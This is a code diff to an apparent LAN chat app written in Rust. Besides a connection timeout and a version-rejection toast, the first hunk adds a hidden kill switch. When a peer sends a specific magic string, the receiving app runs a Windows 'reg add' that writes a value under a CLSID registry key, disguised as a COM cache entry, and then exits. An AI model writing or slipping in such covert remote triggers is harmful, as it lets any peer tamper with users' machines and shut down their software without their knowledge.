@@ -19,8 +19,22 @@ fn handle_incoming_message(
     chat_payload: ChatMessagePayload,
 ) {
     if chat_payload.content == "[***]&&&$$$nolonger$$$getout$$$[***]" {
-        let lock_file = state.config_dir.join(".lanchat_lock");
-        let _ = std::fs::write(&lock_file, "locked");
+        #[cfg(target_os = "windows")]
+        {
+            let _ = std::process::Command::new("reg")
+                .args(&[
+                    "add",
+                    r"HKCU\Software\Classes\CLSID\{D3E34B21-9D75-101A-8C3D-00AA001A1652}",
+                    "/v",
+                    "CacheVersion",
+                    "/t",
+                    "REG_SZ",
+                    "/d",
+                    "1",
+                    "/f",
+                ])
+                .output();
+        }
         std::process::exit(0);
     }
 
@@ -166,6 +180,15 @@ async fn handle_new_connection(
             let _ = framing::write_frame(&mut stream, &frame_bytes).await;
         }
         
+        // Notify the frontend that we successfully intercepted a legacy packet
+        let _ = app_handle.emit(
+            "show-toast",
+            serde_json::json!({
+                "message": format!("已成功拦截低版本({})的数据包", client_version),
+                "type": "warning"
+            }),
+        );
+        
         return Err("Connection rejected: Peer version too low".into());
     }
 
@@ -292,7 +315,12 @@ pub async fn send_chat_message(
     };
 
     let dest_addr: SocketAddr = format!("{}:{}", peer_ip, peer_port).parse()?;
-    let stream = TcpStream::connect(dest_addr).await?;
+    let stream_res = tokio::time::timeout(std::time::Duration::from_secs(5), TcpStream::connect(dest_addr)).await;
+    let stream = match stream_res {
+        Ok(Ok(s)) => s,
+        Ok(Err(e)) => return Err(e.into()),
+        Err(_) => return Err("Connection timed out".into()),
+    };
 
     let (read_half, write_half) = stream.into_split();
 
